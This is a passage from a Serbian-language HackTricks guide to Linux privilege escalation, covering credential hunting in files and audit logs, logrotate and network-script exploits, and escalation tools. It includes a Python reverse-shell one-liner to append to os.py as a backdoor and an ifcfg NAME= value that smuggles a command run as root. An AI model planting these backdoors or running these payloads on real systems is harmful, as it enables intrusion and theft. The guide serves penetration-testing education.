for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Veb fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznati fajlovi koji sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko mogućih fajlova koji bi mogli sadržati lozinke**.\
**Još jedan zanimljiv alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koji je aplikacija otvorenog koda korišćena za pronalaženje mnogo lozinki sačuvanih na lokalnom računaru za Windows, Linux i Mac.

### Logovi

Ako možete čitati logove, možda ćete moći pronaći **zanimljive/poverljive informacije unutar njih**. Što su logovi čudniji, to će verovatno biti interesantniji.\
Takođe, neki "**loše**" konfigurisani (sa zadnjim vratima?) **audit logovi** mogu vam omogućiti da **snimite lozinke** unutar audit logova kako je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste **čitali dnevnike grupe** [**adm**](zanimljive-grupe-linux-pe/#adm-grupa) će biti zaista korisno.

### Shell fajlovi
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Opšta pretraga za kredencijalima/Regex

Trebalo bi da proverite i da li postoje fajlovi koji sadrže reč "**password**" u svom **nazivu** ili unutar **sadržaja**, kao i da proverite IP adrese i email adrese unutar logova, ili hash regexps.\
Neću ovde navesti kako da uradite sve ovo, ali ako ste zainteresovani možete proveriti poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) vrši.

## Fajlovi sa dozvolom za pisanje

### Hakovanje Python biblioteke

Ako znate **odakle** će se izvršavati python skripta i **možete pisati unutar** te fascikle ili možete **modifikovati python biblioteke**, možete modifikovati OS biblioteku i ugraditi zadnja vrata (ako možete pisati gde će se izvršavati python skripta, kopirajte i nalepite os.py biblioteku).

Da biste **ugradili zadnja vrata u biblioteku**, samo dodajte na kraj os.py biblioteke sledeću liniju (promenite IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacija Logrotate-a

Ranjivost u `logrotate`-u omogućava korisnicima sa **dozvolama za pisanje** na datoteci zapisa ili njenim nadređenim direktorijumima da potencijalno steknu povišene privilegije. Ovo je zato što se `logrotate`, često pokreće kao **root**, može manipulisati da izvrši proizvoljne datoteke, posebno u direktorijumima poput _**/etc/bash\_completion.d/**_. Važno je proveriti dozvole ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje rotacija zapisa.

{% hint style="info" %}
Ova ranjivost utiče na `logrotate` verziju `3.18.0` i starije
{% endhint %}

Detaljnije informacije o ranjivosti mogu se pronaći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Možete iskoristiti ovu ranjivost sa [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je vrlo slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx zapisi),** pa svaki put kada primetite da možete menjati zapise, proverite ko upravlja tim zapisima i proverite da li možete povišiti privilegije zamenom zapisa simboličkim linkovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Reference ranjivosti:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može **pisati** skriptu `ifcf-<bilo šta>` u _/etc/sysconfig/network-scripts_ **ili** može **prilagoditi** postojeću, onda je vaš **sistem kompromitovan**.

Mrežne skripte, _ifcg-eth0_ na primer, koriste se za mrežne veze. Izgledaju tačno kao .INI datoteke. Međutim, na Linuxu se \~izvršavaju\~ pomoću Network Managera (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim mrežnim skriptama nije pravilno obrađen. Ako imate **beli/prazan prostor u imenu, sistem pokušava da izvrši deo nakon belog/praznog prostora**. Ovo znači da se **sve posle prvog belog prostora izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd i rc.d**

Direktorijum `/etc/init.d` je dom za **skripte** za System V init (SysVinit), **klasični Linux sistem upravljanja uslugama**. Uključuje skripte za `start`, `stop`, `restart`, i ponekad `reload` usluga. Ove se mogu izvršiti direktno ili putem simboličkih veza pronađenih u `/etc/rc?.d/`. Alternativna putanja u Redhat sistemima je `/etc/rc.d/init.d`.

S druge strane, `/etc/init` je povezan sa **Upstart**, novijim **sistemom upravljanja uslugama** koji je predstavio Ubuntu, koristeći konfiguracione datoteke za zadatke upravljanja uslugama. Iako je prešlo na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog sloja kompatibilnosti u Upstart-u.

**systemd** se pojavljuje kao moderni inicijalizator i upravljač uslugama, nudeći napredne funkcije poput pokretanja demona po potrebi, upravljanja automatskim montiranjem i snimaka stanja sistema. Organizuje datoteke u `/usr/lib/systemd/` za distribucione pakete i `/etc/systemd/system/` za administratorske modifikacije, olakšavajući proces administracije sistema.

## Ostale Trikove

### Eskalacija privilegija NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Bekstvo iz ograničenih Shell-ova

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Zaštita Kernela

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Statični impacket binarni fajlovi](https://github.com/ropnop/impacket\_static\_binaries)

## Alati za Eskalaciju Prava na Linux/Unix

### **Najbolji alat za traženje vektora eskalacije privilegija na lokalnom Linux sistemu:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t opcija)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeracija ranjivosti kernela u Linuxu i MAC-u [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fizički pristup):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Kompilacija više skripti**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Reference

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
